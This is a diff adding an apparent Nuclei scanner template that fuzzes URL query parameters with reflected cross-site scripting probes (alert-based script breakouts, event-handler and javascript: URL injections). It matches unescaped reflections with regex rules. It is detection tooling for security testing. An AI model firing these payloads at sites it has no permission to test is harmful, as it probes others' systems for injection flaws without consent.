@@ -1,0 +1,56 @@
+id: xss-combined-fuzz-context-aware
+
+info:
+  name: Combined Reflected XSS Checks with Advanced Fuzzing (Context-Aware)
+  author: yourname
+  severity: medium
+  description: Fuzzes all query parameters for various reflected XSS vulnerabilities considering the reflection context.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      xss_payloads:
+        - "<xsg>al('xs')</xsg>"
+        - "\"; alert('xss'); //"
+        - "\"-alert(document.domain)-\""
+        - "'-alert(document.domain)-'"
+        - "javascript:alert(document.domain)"
+        - "\"><xss x=\"y\" onmouseover=\"alert('xss')\"></xss>"
+        - "</script><xss x=\"y\" onmouseover=\"alert('xss')\"></xss>"
+        - "\" x=\"y\" onmouseover=\"alert('xss')"
+        - "\" x=\"y\" onscrollsend=\"alert('xs')"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(xss_payloads)}}"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)<xsg>al\\('xs'\\)</xsg>(?:<[^>]+>)*$"
+          - "(?i)<script[^>]*>.*\"; alert\\('xss'\\); //.*</script>"
+          - "(?i)<script[^>]*>[^<]*\"[^\"\\\\]*\"-alert\\(document.domain\\)-\"[^<]*</script>"
+          - "(?i)<script[^>]*>[^<]*'[^\"\\\\]*'-alert\\(document.domain\\)-'[^<]*</script>"
+          - "(?i)<script[^>]*>.*'-alert\\(document.domain\\)-'.*</script>"
+          - "(?i)href\\s*=\\s*[\"']?javascript:alert\\(document.domain\\)"
+          - "(?i)<[^>]*xss x=\"y\" onmouseover=\"alert\\('xss'\\)\"[^>]*>"
+          - "(?i)<[^>]* x=\"y\" onmouseover=\"alert\\('xss'\\)\"[^>]*>"
+          - "(?i)<[^>]* x=\"y\" onscrollsend=\"alert\\('xs'\\)\"[^>]*>"
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - "(?i)<script[^>]*>.*\\\\\"; alert\\('xss'\\); //.*</script>"
+          - "(?i)<script[^>]*>[^<]*\\\\\"; alert\\('xss'\\); //[^<]*</script>"
+          - "(?i)<script[^>]*>[^<]*\\\\'-alert\\(document.domain\\)-'[^<]*</script>"
+          - "(?i)<script[^>]*>[^<]*\"[^\"<]*><xss x=\"y\" onmouseover=\"alert\\('xss'\\)\"></xss>[^\"<]*\"[^<]*</script>"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
